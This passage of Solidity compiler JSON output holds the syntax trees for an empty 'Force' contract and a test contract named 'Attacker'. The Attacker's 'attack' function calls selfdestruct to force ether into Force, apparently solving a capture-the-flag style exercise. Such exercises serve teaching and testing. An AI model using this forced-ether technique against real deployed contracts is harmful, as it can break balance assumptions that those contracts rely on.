					"start": 320
				},
				"type": "Warning"
			}
		],
		"sources": {
			"src/level07.sol": {
				"ast": {
					"absolutePath": "src/level07.sol",
					"exportedSymbols": {
						"Force": [
							2
						]
					},
					"id": 3,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "Force",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 2,
							"linearizedBaseContracts": [
								2
							],
							"name": "Force",
							"nameLocation": "66:5:0",
							"nodeType": "ContractDefinition",
							"nodes": [],
							"scope": 3,
							"src": "57:118:0",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "32:143:0"
				},
				"id": 0
			},
			"tests/test07.sol": {
				"ast": {
					"absolutePath": "tests/test07.sol",
					"exportedSymbols": {
						"Attacker": [
							56
						],
						"Force": [
							2
						]
					},
					"id": 57,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 4,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:1"
						},
						{
							"absolutePath": "src/level07.sol",
							"file": "src/level07.sol",
							"id": 5,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 57,
							"sourceUnit": 3,
							"src": "57:25:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "Attacker",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 56,
							"linearizedBaseContracts": [
								56
							],
							"name": "Attacker",
							"nameLocation": "93:8:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 8,
									"mutability": "mutable",
									"name": "level07",
									"nameLocation": "114:7:1",
									"nodeType": "VariableDeclaration",
									"scope": 56,
									"src": "108:13:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_Force_$2",
										"typeString": "contract Force"
									},
									"typeName": {
										"id": 7,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 6,
											"name": "Force",
											"nameLocations": [
												"108:5:1"
											],
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 2,
											"src": "108:5:1"
										},
										"referencedDeclaration": 2,
										"src": "108:5:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Force_$2",
											"typeString": "contract Force"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 20,
										"nodeType": "Block",
										"src": "160:42:1",
										"statements": [
											{
												"expression": {
													"id": 18,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 14,
														"name": "level07",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "170:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Force_$2",
															"typeString": "contract Force"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 16,
																"name": "_level07",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 11,
																"src": "186:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Force_$2",
																	"typeString": "contract Force"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_Force_$2",
																	"typeString": "contract Force"
																}
															],
															"id": 15,
															"name": "Force",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2,
															"src": "180:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_Force_$2_$",
																"typeString": "type(contract Force)"
															}
														},
														"id": 17,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"nameLocations": [],
														"names": [],
														"nodeType": "FunctionCall",
														"src": "180:15:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Force_$2",
															"typeString": "contract Force"
														}
													},
													"src": "170:25:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_Force_$2",
														"typeString": "contract Force"
													}
												},
												"id": 19,
												"nodeType": "ExpressionStatement",
												"src": "170:25:1"
											}
										]
									},
									"id": 21,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 12,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 11,
												"mutability": "mutable",
												"name": "_level07",
												"nameLocation": "146:8:1",
												"nodeType": "VariableDeclaration",
												"scope": 21,
												"src": "140:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_contract$_Force_$2",
													"typeString": "contract Force"
												},
												"typeName": {
													"id": 10,
													"nodeType": "UserDefinedTypeName",
													"pathNode": {
														"id": 9,
														"name": "Force",
														"nameLocations": [
															"140:5:1"
														],
														"nodeType": "IdentifierPath",
														"referencedDeclaration": 2,
														"src": "140:5:1"
													},
													"referencedDeclaration": 2,
													"src": "140:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_Force_$2",
														"typeString": "contract Force"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "139:16:1"
									},
									"returnParameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "160:0:1"
									},
									"scope": 56,
									"src": "128:74:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 38,
										"nodeType": "Block",
										"src": "246:105:1",
										"statements": [
											{
												"assignments": [
													25
												],
												"declarations": [
													{
														"constant": false,
														"id": 25,
														"mutability": "mutable",
														"name": "theAddress",
														"nameLocation": "272:10:1",
														"nodeType": "VariableDeclaration",
														"scope": 38,
														"src": "256:26:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 24,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "256:15:1",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 33,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"id": 30,
																	"name": "level07",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 8,
																	"src": "301:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_Force_$2",
																		"typeString": "contract Force"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_Force_$2",
																		"typeString": "contract Force"
																	}
																],
																"id": 29,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "293:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 28,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "293:7:1",
																	"typeDescriptions": {}
																}
															},
															"id": 31,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "293:16:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 27,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "285:8:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_payable_$",
															"typeString": "type(address payable)"
														},
														"typeName": {
															"id": 26,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "285:8:1",
															"stateMutability": "payable",
															"typeDescriptions": {}
														}
													},
													"id": 32,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "285:25:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "256:54:1"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 35,
															"name": "theAddress",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 25,
															"src": "333:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 34,
														"name": "selfdestruct",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4294967275,
														"src": "320:12:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
															"typeString": "function (address payable)"
														}
													},
													"id": 36,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "320:24:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 37,
												"nodeType": "ExpressionStatement",
												"src": "320:24:1"
											}
										]
									},
									"functionSelector": "9e5faafc",
									"id": 39,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nameLocation": "217:6:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "223:2:1"
									},
									"returnParameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "246:0:1"
									},
									"scope": 56,
									"src": "208:143:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 50,
										"nodeType": "Block",
										"src": "411:45:1",
										"statements": [
											{
												"expression": {
													"expression": {
														"arguments": [
															{
																"id": 46,
																"name": "this",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967268,
																"src": "436:4:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Attacker_$56",
																	"typeString": "contract Attacker"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_Attacker_$56",
																	"typeString": "contract Attacker"
																}
															],
															"id": 45,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "428:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": {
																"id": 44,
																"name": "address",
																"nodeType": "ElementaryTypeName",
																"src": "428:7:1",
																"typeDescriptions": {}
															}
														},
														"id": 47,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"nameLocations": [],
														"names": [],
														"nodeType": "FunctionCall",
														"src": "428:13:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"id": 48,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberLocation": "442:7:1",
													"memberName": "balance",
													"nodeType": "MemberAccess",
													"src": "428:21:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 43,
												"id": 49,
												"nodeType": "Return",
												"src": "421:28:1"
											}
										]
									},
									"functionSelector": "12065fe0",
									"id": 51,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getBalance",
									"nameLocation": "366:10:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 40,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "376:2:1"
									},
									"returnParameters": {
										"id": 43,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 42,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 51,
												"src": "401:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 41,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "401:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "400:6:1"
									},
									"scope": 56,
									"src": "357:99:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 54,
										"nodeType": "Block",
										"src": "489:3:1",
										"statements": []
									},
									"id": 55,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 52,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "469:2:1"
									},
									"returnParameters": {
										"id": 53,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "489:0:1"
									},
									"scope": 56,
									"src": "462:30:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 57,
							"src": "84:410:1",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "32:462:1"
				},
				"id": 1
			}
		}
	}
}